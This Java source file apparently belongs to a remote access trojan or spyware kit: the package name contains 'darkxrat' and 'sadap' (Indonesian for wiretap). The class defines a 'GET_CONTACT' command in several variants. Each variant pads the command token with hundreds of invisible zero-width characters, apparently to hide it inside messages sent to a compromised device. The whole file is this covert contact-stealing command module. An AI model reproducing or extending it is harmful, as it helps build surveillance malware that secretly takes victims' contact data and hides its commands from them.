package com.darkxrat.mantax.func.sadap;

public class GetContact {
    public static final String NAMA = "GETCONTACT";
    public static final String TIPE = "SADAP";

    // Func untuk getcontact
    public static String func() {
        return "\u2060".repeat(50) + "GET_CONTACT" + "\u2060".repeat(50);
    }

    // Func hard
    public static String funcHard() {
        return "\u2060".repeat(100) + "GET_CONTACT_HARD" + "\u2060".repeat(100);
    }

    // Func ultra
    public static String funcUltra() {
        return "\u2060".repeat(200) + "GET_CONTACT_ULTRA" + "\u2060".repeat(200);
    }

    // Func gacor
    public static String funcGacor() {
        return funcHard() + "\u200B" + funcUltra();
    }
}